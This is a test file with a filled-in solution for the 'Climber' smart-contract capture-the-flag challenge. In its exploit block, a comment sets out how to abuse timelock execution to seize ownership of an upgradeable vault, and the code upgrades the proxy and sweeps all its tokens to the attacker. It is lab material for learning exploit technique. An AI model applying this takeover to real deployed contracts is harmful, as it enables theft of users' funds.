const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [deployer.address, proposer.address, sweeper.address],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);

        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);

        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        /**
         * EXPLOIT:
         * 
         * In order to sweep all the funds in the vault
         * the attacker must claim ownership of the proxy in order to
         * upgrade to a new implementation contract in which the 
         * the function to sweep the funds is callable by the owner,
         * which is now the attacker
         * 
         * As the timelock starts as the owner, the attacker must 
         * utilise calling the transferOwnership call on the proxy
         * on behalf of the timelock.
         * 
         * This can be acheived by calling the execute function on 
         * the timelock with parameters that perform a sequence of tasks
         * in order to claim ownership of the proxy.
         * 1. Reduce timelock deplay to 0
         * 2. Grant proposer role to this contract
         * 3. Tranfer ownership of ClimberVault to this contract
         * 4. Schedule the above tasks indirectly
         */

        //deploy attack contract
        this.attackerContract = await (await ethers.getContractFactory('AttackClimber', attacker)).deploy(
            this.timelock.address,
            this.vault.address
        )

        //start attack
        await this.attackerContract.attack()

        //upgrade to attacker's vault
        this.attackersVault = await upgrades.upgradeProxy(
            this.vault.address,
            await ethers.getContractFactory('AttackersVault', attacker)
        )

        //steal funds via attacker's vault
        await this.attackersVault.sweepFunds(this.token.address)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
